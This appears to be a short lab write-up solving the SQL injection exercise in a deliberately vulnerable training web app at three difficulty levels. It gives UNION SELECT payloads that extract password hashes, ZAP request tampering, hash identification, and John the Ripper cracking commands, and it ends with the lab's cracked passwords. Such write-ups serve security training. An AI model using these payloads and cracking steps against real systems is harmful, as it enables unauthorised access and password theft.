#Task - SQL injection: There are 5 users in the database with ids from 1 to 5, steal their passwords using SQLi.

#Low difficulty: There is no protection from an SQLi, only the query has to be escaped to execute any SQL query
1 'UNION SELECT user, password FROM users#
#The output will give the hashes of the passwords which can then be decrypted using John the Ripper.

#Meduim difficulty: There is some protection from SQLi, the text box has also been replaced by a droplist. 
#First, select user id = 1 and send a request. Capture that request in ZAP and send it to request editor, where the request can be edited
#along with desired query making it possible to get passwords.
1 or 1=1 UNION SELECT user, password FROM users#

#Hard difficulty: In this, the input values are being transferred to the vulnerable query via session variables using another page rather
#than a direct get request. This is similar to low difficulty and the same can be used for it.
1 ' UNION SELECT user, password FROM users#

#The hashes obtained can be cracked using John the Ripper.
#First the type of hash algorithm used needs to be identified, this can be done by using hash-identifier
hash-identifier <hash>
#The result is MD5
#Place them in a txt file and then using john the ripper it can be cracked 
john --show --format=Raw-MD5 hashes.txt

#The passwords are: 
#1. password
#2. abc123
#3. charley
#4. letmein
#5. password
